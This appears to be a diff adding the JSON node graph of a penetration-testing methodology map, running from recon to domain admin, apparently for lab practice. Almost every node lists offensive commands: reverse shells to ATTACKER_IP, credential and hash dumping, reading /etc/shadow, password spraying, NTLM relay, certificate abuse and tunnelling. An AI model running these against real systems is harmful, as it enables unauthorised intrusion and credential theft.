@@ -1,0 +1,1095 @@
+[
+  {
+    "id": "host-discovery",
+    "title": "Host Discovery",
+    "stage": "recon",
+    "tags": [
+      "windows",
+      "linux"
+    ],
+    "tools": [
+      "nmap -sn 192.168.1.0/24",
+      "fping -ag 192.168.1.0/24 2>/dev/null",
+      "arp-scan --localnet",
+      "netdiscover -r 192.168.1.0/24"
+    ],
+    "leads_to": [
+      "nmap-scan"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/01-recon/host-discovery.md"
+  },
+  {
+    "id": "nmap-scan",
+    "title": "Nmap / RustScan",
+    "stage": "recon",
+    "tags": [
+      "windows",
+      "linux"
+    ],
+    "tools": [
+      "rustscan -a $TARGET --ulimit 5000 -b 500 -- -Pn 2>/dev/null | tee recon/rustscan.out",
+      "PORTS=$(grep -oP '\\d+(?=/tcp)' recon/rustscan.out | tr '\\n' ',' | sed 's/,$//'); sudo nmap -Pn -sC -sV -p $PORTS -oN recon/tcp.out $TARGET",
+      "sudo nmap -Pn -sU --top-ports 20 -oN recon/udp.out $TARGET &",
+      "sudo nmap -Pn -sC -sV -p- --open -oN recon/tcp.out $TARGET"
+    ],
+    "leads_to": [
+      "smb-enum",
+      "ldap-enum",
+      "web-enum",
+      "nfs-enum",
+      "ftp-enum",
+      "smtp-enum",
+      "mssql-enum",
+      "mysql-enum",
+      "redis-enum",
+      "dns-enum",
+      "snmp-enum"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/01-recon/nmap-scan.md"
+  },
+  {
+    "id": "passive-recon",
+    "title": "Passive Recon / OSINT",
+    "stage": "recon",
+    "tags": [
+      "web"
+    ],
+    "tools": [
+      "theHarvester -d $DOMAIN -b all",
+      "whois $DOMAIN",
+      "subfinder -d $DOMAIN",
+      "amass enum -passive -d $DOMAIN"
+    ],
+    "leads_to": [
+      "dns-enum",
+      "web-enum"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/01-recon/passive-recon.md"
+  },
+  {
+    "id": "dns-enum",
+    "title": "DNS Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "windows",
+      "linux",
+      "web"
+    ],
+    "tools": [
+      "dig axfr @$TARGET $DOMAIN",
+      "dnsrecon -d $DOMAIN -t axfr",
+      "gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
+      "dnsrecon -d $DOMAIN -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt"
+    ],
+    "leads_to": [
+      "web-enum",
+      "nmap-scan"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/02-enum/dns-enum.md"
+  },
+  {
+    "id": "ftp-enum",
+    "title": "FTP Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "windows",
+      "linux"
+    ],
+    "tools": [
+      "nmap -Pn -sV -p 21 --script=\"ftp*\" $TARGET",
+      "ftp $TARGET",
+      "wget -r --no-passive ftp://anonymous:@$TARGET/",
+      "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$TARGET"
+    ],
+    "leads_to": [
+      "public-exploit",
+      "file-upload-shell"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/02-enum/ftp-enum.md"
+  },
+  {
+    "id": "ldap-enum",
+    "title": "LDAP Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "ldapsearch -H ldap://$TARGET -x -b \"\" -s base namingContexts",
+      "ldapsearch -H ldap://$TARGET -x -b \"DC=domain,DC=local\" -s sub \"(objectClass=*)\" | grep -iE \"sAMAccountName|description|mail|memberOf",
+      "ldapdomaindump -u '' $TARGET",
+      "nxc ldap $TARGET -u '' -p '"
+    ],
+    "leads_to": [
+      "asreproast",
+      "kerberoast",
+      "password-spray"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/02-enum/ldap-enum.md"
+  },
+  {
+    "id": "mssql-enum",
+    "title": "MSSQL Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "windows"
+    ],
+    "tools": [
+      "nmap -Pn -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info $TARGET",
+      "mssqlclient.py -db msdb 'DOMAIN/user:password@$TARGET",
+      "mssqlclient.py -db msdb -windows-auth 'DOMAIN/user:password@$TARGET"
+    ],
+    "leads_to": [
+      "public-exploit",
+      "sqli-rce",
+      "rev-shell"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/02-enum/mssql-enum.md"
+  },
+  {
+    "id": "mysql-enum",
+    "title": "MySQL Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "windows",
+      "linux"
+    ],
+    "tools": [
+      "mysql -h $TARGET -u root",
+      "mysql -h $TARGET -u root -p'"
+    ],
+    "leads_to": [
+      "sqli-rce",
+      "rev-shell"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/02-enum/mysql-enum.md"
+  },
+  {
+    "id": "nfs-enum",
+    "title": "NFS Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "linux"
+    ],
+    "tools": [
+      "showmount -e $TARGET",
+      "sudo mount -o rw,vers=2 $TARGET:/share /mnt/nfs",
+      "cat /etc/exports | grep no_root_squash"
+    ],
+    "leads_to": [
+      "ssh-access",
+      "linux-suid-caps"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/02-enum/nfs-enum.md"
+  },
+  {
+    "id": "redis-enum",
+    "title": "Redis Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "linux"
+    ],
+    "tools": [
+      "redis-cli -h $TARGET ping",
+      "redis-cli -h $TARGET info",
+      "redis-cli -h $TARGET config get dir"
+    ],
+    "leads_to": [
+      "rev-shell",
+      "ssh-access"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/02-enum/redis-enum.md"
+  },
+  {
+    "id": "smb-enum",
+    "title": "SMB Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "windows",
+      "smb"
+    ],
+    "tools": [
+      "nxc smb $TARGET -u '' -p '",
+      "enum4linux-ng $TARGET",
+      "smbclient -L //$TARGET/ -U '' -N",
+      "smbmap -H $TARGET -u '' -p '",
+      "rpcclient -U \"\" -N $TARGET -c \"enumdomusers;enumdomgroups;netshareenum",
+      "nmap -Pn -p 445 --script smb-vuln* $TARGET"
+    ],
+    "leads_to": [
+      "null-session",
+      "password-spray",
+      "public-exploit"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/02-enum/smb-enum.md"
+  },
+  {
+    "id": "smtp-enum",
+    "title": "SMTP Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "windows",
+      "linux"
+    ],
+    "tools": [
+      "smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $TARGET",
+      "nmap -Pn -p 25 --script smtp-enum-users,smtp-commands $TARGET",
+      "swaks --to test@$DOMAIN --from att@att.com --server $TARGET"
+    ],
+    "leads_to": [
+      "password-spray"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/02-enum/smtp-enum.md"
+  },
+  {
+    "id": "snmp-enum",
+    "title": "SNMP Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "windows",
+      "linux"
+    ],
+    "tools": [
+      "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET",
+      "snmpwalk -c public -v2c $TARGET",
+      "snmp-check $TARGET -c public"
+    ],
+    "leads_to": [
+      "password-spray"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/02-enum/snmp-enum.md"
+  },
+  {
+    "id": "web-enum",
+    "title": "Web Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "web"
+    ],
+    "tools": [
+      "whatweb -a 3 http://$TARGET && curl -sI http://$TARGET | grep -iE \"server|x-powered|content-type",
+      "feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip,conf -t 40 --auto-tune -o recon/ferox.out",
+      "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$TARGET -H \"Host: FUZZ.$DOMAIN\" -fw 0",
+      "gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip -t 40"
+    ],
+    "leads_to": [
+      "sqli-rce",
+      "lfi-rce",
+      "file-upload-shell",
+      "ssti-rce",
+      "public-exploit"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/02-enum/web-enum.md"
+  },
+  {
+    "id": "asreproast",
+    "title": "AS-REP Roasting",
+    "stage": "initial-access",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt",
+      "impacket-GetNPUsers $DOMAIN/user:password -dc-ip $DC_IP -request -format hashcat -outputfile asrep.txt",
+      "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
+    ],
+    "leads_to": [
+      "winrm",
+      "rev-shell",
+      "rdp-access"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/03-initial-access/asreproast.md"
+  },
+  {
+    "id": "file-upload-shell",
+    "title": "File Upload → Shell",
+    "stage": "initial-access",
+    "tags": [
+      "windows",
+      "linux",
+      "web"
+    ],
+    "tools": [
+      "curl -F 'file=@shell.php;type=image/jpeg' http://$TARGET/upload"
+    ],
+    "leads_to": [
+      "web-shell",
+      "rev-shell"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/03-initial-access/file-upload-shell.md"
+  },
+  {
+    "id": "kerberoast",
+    "title": "Kerberoasting",
+    "stage": "initial-access",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $DC_IP -request -outputfile kerberoast.txt",
+      "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt"
+    ],
+    "leads_to": [
+      "winrm",
+      "rev-shell",
+      "rdp-access"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/03-initial-access/kerberoast.md"
+  },
+  {
+    "id": "lfi-rce",
+    "title": "LFI → RCE",
+    "stage": "initial-access",
+    "tags": [
+      "linux",
+      "web"
+    ],
+    "tools": [
+      "ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u \"http://$TARGET/page.php?FUZZ=../../../../etc/passwd\" -fs 0"
+    ],
+    "leads_to": [
+      "rev-shell"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/03-initial-access/lfi-rce.md"
+  },
+  {
+    "id": "ntlm-relay",
+    "title": "NTLM Relay",
+    "stage": "initial-access",
+    "tags": [
+      "windows",
+      "ad",
+      "smb"
+    ],
+    "tools": [
+      "impacket-ntlmrelayx -tf targets.txt -smb2support",
+      "impacket-ntlmrelayx -tf targets.txt -smb2support -i",
+      "impacket-ntlmrelayx -t http://$DC_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+    ],
+    "leads_to": [
+      "rev-shell",
+      "pass-the-hash",
+      "domain-admin"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/03-initial-access/ntlm-relay.md"
+  },
+  {
+    "id": "null-session",
+    "title": "SMB Null Session",
+    "stage": "initial-access",
+    "tags": [
+      "windows",
+      "smb"
+    ],
+    "tools": [
+      "smbclient //$TARGET/ShareName -U '' -N",
+      "rpcclient -U \"\" -N $TARGET -c \"enumdomusers",
+      "nxc smb $TARGET -u '' -p '' --shares"
+    ],
+    "leads_to": [
+      "rev-shell",
+      "password-spray"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/03-initial-access/null-session.md"
+  },
+  {
+    "id": "password-spray",
+    "title": "Password Spraying",
+    "stage": "initial-access",
+    "tags": [
+      "windows",
+      "linux",
+      "ad",
+      "smb"
+    ],
+    "tools": [
+      "nxc smb $DC_IP -u '' -p '' --pass-pol",
+      "kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Password123",
+      "nxc smb $DC_IP -u users.txt -p 'Password123' --continue-on-success",
+      "nxc smb $DC_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success"
+    ],
+    "leads_to": [
+      "winrm",
+      "rev-shell",
+      "rdp-access",
+      "ssh-access",
+      "bloodhound"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/03-initial-access/password-spray.md"
+  },
+  {
+    "id": "public-exploit",
+    "title": "Public Exploit (CVE)",
+    "stage": "initial-access",
+    "tags": [
+      "windows",
+      "linux",
+      "web",
+      "smb"
+    ],
+    "tools": [
+      "searchsploit \"$SERVICE $VERSION",
+      "nmap -Pn -p $PORT --script vuln $TARGET"
+    ],
+    "leads_to": [
+      "rev-shell",
+      "system-shell"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/03-initial-access/public-exploit.md"
+  },
+  {
+    "id": "responder",
+    "title": "Responder / LLMNR Poisoning",
+    "stage": "initial-access",
+    "tags": [
+      "windows",
+      "ad",
+      "smb"
+    ],
+    "tools": [
+      "nxc smb 192.168.x.0/24 --gen-relay-list targets.txt",
+      "sudo responder -I tun0 -dwv",
+      "hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt"
+    ],
+    "leads_to": [
+      "ntlm-relay",
+      "password-spray"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/03-initial-access/responder.md"
+  },
+  {
+    "id": "sqli-rce",
+    "title": "SQLi → RCE",
+    "stage": "initial-access",
+    "tags": [
+      "web"
+    ],
+    "tools": [
+      "sqlmap -r request.txt --batch --dbs",
+      "sqlmap -r request.txt --batch --os-shell",
+      "sqlmap -r request.txt --dbms=mssql --batch --level=5 --risk=3"
+    ],
+    "leads_to": [
+      "rev-shell",
+      "web-shell"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/03-initial-access/sqli-rce.md"
+  },
+  {
+    "id": "ssti-rce",
+    "title": "SSTI → RCE",
+    "stage": "initial-access",
+    "tags": [
+      "web"
+    ],
+    "tools": [
+      "tplmap -u 'http://$TARGET/page?name=INJECT' --os-shell"
+    ],
+    "leads_to": [
+      "rev-shell"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/03-initial-access/ssti-rce.md"
+  },
+  {
+    "id": "pass-the-hash",
+    "title": "Pass the Hash / Ticket",
+    "stage": "foothold",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "evil-winrm -i $TARGET -u Administrator -H NTLM_HASH",
+      "impacket-psexec Administrator@$TARGET -hashes :NTLM_HASH",
+      "impacket-wmiexec Administrator@$TARGET -hashes :NTLM_HASH",
+      "nxc smb 192.168.x.0/24 -u Administrator -H NTLM_HASH --local-auth"
+    ],
+    "leads_to": [
+      "token-impersonation",
+      "bloodhound",
+      "dcsync"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/04-foothold/pass-the-hash.md"
+  },
+  {
+    "id": "rdp-access",
+    "title": "RDP Access",
+    "stage": "foothold",
+    "tags": [
+      "windows"
+    ],
+    "tools": [
+      "xfreerdp /u:user /p:password /v:$TARGET",
+      "xfreerdp /u:Administrator /pth:NTLM_HASH /v:$TARGET",
+      "nmap -Pn -p 3389 --script rdp-enum-encryption $TARGET"
+    ],
+    "leads_to": [
+      "token-impersonation",
+      "windows-stored-creds",
+      "bloodhound"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/04-foothold/rdp-access.md"
+  },
+  {
+    "id": "rev-shell",
+    "title": "Reverse Shell",
+    "stage": "foothold",
+    "tags": [
+      "windows",
+      "linux"
+    ],
+    "tools": [
+      "rlwrap nc -nvlp 4444",
+      "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'",
+      "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\\\"ATTACKER_IP\\\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])'",
+      "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f"
+    ],
+    "leads_to": [
+      "linux-sudo",
+      "linux-suid-caps",
+      "linux-cron",
+      "linux-kernel",
+      "linux-cred-hunting",
+      "token-impersonation",
+      "windows-service-misconfig",
+      "windows-stored-creds",
+      "bloodhound"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/04-foothold/rev-shell.md"
+  },
+  {
+    "id": "ssh-access",
+    "title": "SSH Access",
+    "stage": "foothold",
+    "tags": [
+      "linux"
+    ],
+    "tools": [
+      "ssh user@$TARGET",
+      "ssh -i id_rsa user@$TARGET",
+      "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4"
+    ],
+    "leads_to": [
+      "linux-sudo",
+      "linux-suid-caps",
+      "linux-cron",
+      "linux-kernel",
+      "linux-cred-hunting",
+      "linux-path-hijack"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/04-foothold/ssh-access.md"
+  },
+  {
+    "id": "web-shell",
+    "title": "Web Shell",
+    "stage": "foothold",
+    "tags": [
+      "windows",
+      "linux",
+      "web"
+    ],
+    "tools": [
+      "curl http://$TARGET/uploads/shell.php?cmd=id"
+    ],
+    "leads_to": [
+      "linux-suid-caps",
+      "linux-sudo",
+      "token-impersonation",
+      "rev-shell"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/04-foothold/web-shell.md"
+  },
+  {
+    "id": "winrm",
+    "title": "WinRM Access",
+    "stage": "foothold",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "evil-winrm -i $IP -u $USER -p $PASS",
+      "evil-winrm -i $IP -u $USER -H $NTLM_HASH",
+      "nxc winrm $IP -u $USER -p $PASS"
+    ],
+    "leads_to": [
+      "token-impersonation",
+      "windows-stored-creds",
+      "windows-sebackup",
+      "acl-abuse",
+      "dcsync",
+      "bloodhound"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/04-foothold/winrm.md"
+  },
+  {
+    "id": "acl-abuse",
+    "title": "ACL Abuse (AD)",
+    "stage": "privesc",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "bloodyAD -u user -p password -d $DOMAIN --host $DC_IP set password target_user 'NewPass123!",
+      "nxc ldap $DC_IP -u user -p password --gmsa",
+      "impacket-dacledit $DOMAIN/$USER:$PASS -action write -rights DCSync -target-dn \"DC=domain,DC=local\" -principal $USER"
+    ],
+    "leads_to": [
+      "dcsync",
+      "winrm",
+      "domain-admin"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/acl-abuse.md"
+  },
+  {
+    "id": "adcs-esc1",
+    "title": "ADCS ESC1 — Enrollee Supplies Subject",
+    "stage": "privesc",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "certipy find -u user@$DOMAIN -p password -dc-ip $DC_IP -vulnerable -stdout",
+      "certipy req -u user@$DOMAIN -p password -dc-ip $DC_IP -ca CA-NAME -template VulnerableTemplate -upn Administrator@$DOMAIN",
+      "certipy auth -pfx administrator.pfx -dc-ip $DC_IP"
+    ],
+    "leads_to": [
+      "domain-admin",
+      "dcsync"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/adcs-esc1.md"
+  },
+  {
+    "id": "adcs-esc4",
+    "title": "ADCS ESC4 — Writable Template ACL",
+    "stage": "privesc",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "certipy template -u user@$DOMAIN -p password -dc-ip $DC_IP -template TargetTemplate -save-old",
+      "certipy template -u user@$DOMAIN -p password -dc-ip $DC_IP -template TargetTemplate -write-default-configuration",
+      "certipy req -u user@$DOMAIN -p password -dc-ip $DC_IP -ca CA-NAME -template TargetTemplate -upn Administrator@$DOMAIN"
+    ],
+    "leads_to": [
+      "adcs-esc1",
+      "domain-admin",
+      "dcsync"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/adcs-esc4.md"
+  },
+  {
+    "id": "bloodhound",
+    "title": "BloodHound Enumeration",
+    "stage": "privesc",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "bloodhound-python -u user -p password -d $DOMAIN -dc $DC_IP -c All",
+      "SharpHound.exe -c All --zipfilename loot.zip"
+    ],
+    "leads_to": [
+      "acl-abuse",
+      "adcs-esc1",
+      "adcs-esc4",
+      "dcsync",
+      "kerberoast"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/bloodhound.md"
+  },
+  {
+    "id": "dcsync",
+    "title": "DCSync",
+    "stage": "privesc",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "impacket-secretsdump $DOMAIN/user:password@$DC_IP",
+      "impacket-secretsdump -just-dc-user krbtgt $DOMAIN/user:password@$DC_IP"
+    ],
+    "leads_to": [
+      "domain-admin",
+      "golden-ticket"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/dcsync.md"
+  },
+  {
+    "id": "linux-cred-hunting",
+    "title": "Linux Credential Hunting",
+    "stage": "privesc",
+    "tags": [
+      "linux"
+    ],
+    "tools": [
+      "find / -name \"*.conf\" 2>/dev/null | xargs grep -li \"password\" 2>/dev/null",
+      "cat ~/.bash_history",
+      "find / -name \"id_rsa\" -o -name \"id_ecdsa\" 2>/dev/null"
+    ],
+    "leads_to": [
+      "linux-sudo",
+      "root-linux",
+      "ssh-access"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/linux-cred-hunting.md"
+  },
+  {
+    "id": "linux-cron",
+    "title": "Linux Cron Abuse",
+    "stage": "privesc",
+    "tags": [
+      "linux"
+    ],
+    "tools": [
+      "cat /etc/crontab",
+      "/tmp/pspy64"
+    ],
+    "leads_to": [
+      "root-linux"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/linux-cron.md"
+  },
+  {
+    "id": "linux-kernel",
+    "title": "Linux Kernel Exploits",
+    "stage": "privesc",
+    "tags": [
+      "linux"
+    ],
+    "tools": [
+      "uname -a",
+      "searchsploit linux kernel",
+      "/tmp/PwnKit"
+    ],
+    "leads_to": [
+      "root-linux"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/linux-kernel.md"
+  },
+  {
+    "id": "linux-path-hijack",
+    "title": "Linux PATH Hijacking",
+    "stage": "privesc",
+    "tags": [
+      "linux"
+    ],
+    "tools": [
+      "echo $PATH",
+      "strings /usr/bin/suid_binary | grep -v '^/'"
+    ],
+    "leads_to": [
+      "root-linux"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/linux-path-hijack.md"
+  },
+  {
+    "id": "linux-sudo",
+    "title": "Linux Sudo Abuse",
+    "stage": "privesc",
+    "tags": [
+      "linux"
+    ],
+    "tools": [
+      "sudo -l",
+      "sudo -u#-1 /bin/bash"
+    ],
+    "leads_to": [
+      "root-linux"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/linux-sudo.md"
+  },
+  {
+    "id": "linux-suid-caps",
+    "title": "Linux SUID / Capabilities",
+    "stage": "privesc",
+    "tags": [
+      "linux"
+    ],
+    "tools": [
+      "find / -perm -4000 -type f 2>/dev/null",
+      "getcap -r / 2>/dev/null"
+    ],
+    "leads_to": [
+      "root-linux"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/linux-suid-caps.md"
+  },
+  {
+    "id": "token-impersonation",
+    "title": "Token Impersonation (SeImpersonate)",
+    "stage": "privesc",
+    "tags": [
+      "windows"
+    ],
+    "tools": [
+      "whoami /priv",
+      "GodPotato-NET4.exe -cmd \"cmd /c whoami",
+      "PrintSpoofer64.exe -i -c cmd"
+    ],
+    "leads_to": [
+      "system-shell",
+      "windows-stored-creds",
+      "dcsync"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/token-impersonation.md"
+  },
+  {
+    "id": "windows-sebackup",
+    "title": "SeBackupPrivilege",
+    "stage": "privesc",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "whoami /priv | findstr /i SeBackupPrivilege",
+      "reg save HKLM\\\\SAM C:\\\\Temp\\\\SAM",
+      "impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL"
+    ],
+    "leads_to": [
+      "pass-the-hash",
+      "domain-admin",
+      "dcsync"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/windows-sebackup.md"
+  },
+  {
+    "id": "windows-service-misconfig",
+    "title": "Windows Service Misconfiguration",
+    "stage": "privesc",
+    "tags": [
+      "windows"
+    ],
+    "tools": [
+      "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}",
+      "Get-ModifiableServiceFile",
+      "wmic service get name,displayname,pathname,startmode"
+    ],
+    "leads_to": [
+      "system-shell",
+      "token-impersonation"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/windows-service-misconfig.md"
+  },
+  {
+    "id": "windows-stored-creds",
+    "title": "Windows Stored Credentials",
+    "stage": "privesc",
+    "tags": [
+      "windows"
+    ],
+    "tools": [
+      "cmdkey /list",
+      "reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+      "lazagne.exe all"
+    ],
+    "leads_to": [
+      "winrm",
+      "pass-the-hash",
+      "system-shell"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/windows-stored-creds.md"
+  },
+  {
+    "id": "domain-admin",
+    "title": "Domain Admin / Proof",
+    "stage": "objective",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "impacket-secretsdump $DOMAIN/Administrator:password@$DC_IP",
+      "evil-winrm -i $DC_IP -u Administrator -H $NTLM"
+    ],
+    "leads_to": [
+      "golden-ticket",
+      "pivot"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/06-objective/domain-admin.md"
+  },
+  {
+    "id": "golden-ticket",
+    "title": "Golden Ticket",
+    "stage": "objective",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "impacket-secretsdump -just-dc-user krbtgt $DOMAIN/user:password@$DC_IP",
+      "impacket-lookupsid $DOMAIN/user:password@$DC_IP 0"
+    ],
+    "leads_to": [
+      "domain-admin"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/06-objective/golden-ticket.md"
+  },
+  {
+    "id": "pivot",
+    "title": "Pivot / Tunneling",
+    "stage": "objective",
+    "tags": [
+      "windows",
+      "linux"
+    ],
+    "tools": [
+      "./chisel server --port 9090 --reverse",
+      "./chisel client ATTACKER_IP:9090 R:socks",
+      "./proxy -selfcert -laddr 0.0.0.0:11601",
+      "ssh -D 1080 -N user@PIVOT_HOST"
+    ],
+    "leads_to": [
+      "nmap-scan",
+      "smb-enum",
+      "ldap-enum"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/06-objective/pivot.md"
+  },
+  {
+    "id": "root-linux",
+    "title": "Root Flag / Proof (Linux)",
+    "stage": "objective",
+    "tags": [
+      "linux"
+    ],
+    "tools": [
+      "cat /root/root.txt",
+      "cat /root/proof.txt",
+      "cat /etc/shadow"
+    ],
+    "leads_to": [
+      "pivot"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/06-objective/root-linux.md"
+  },
+  {
+    "id": "system-shell",
+    "title": "SYSTEM Shell / Proof (Windows)",
+    "stage": "objective",
+    "tags": [
+      "windows"
+    ],
+    "tools": [
+      "type C:\\Users\\Administrator\\Desktop\\root.txt",
+      "impacket-secretsdump $DOMAIN/user:password@$TARGET"
+    ],
+    "leads_to": [
+      "pass-the-hash",
+      "domain-admin",
+      "pivot"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/06-objective/system-shell.md"
+  }
+]
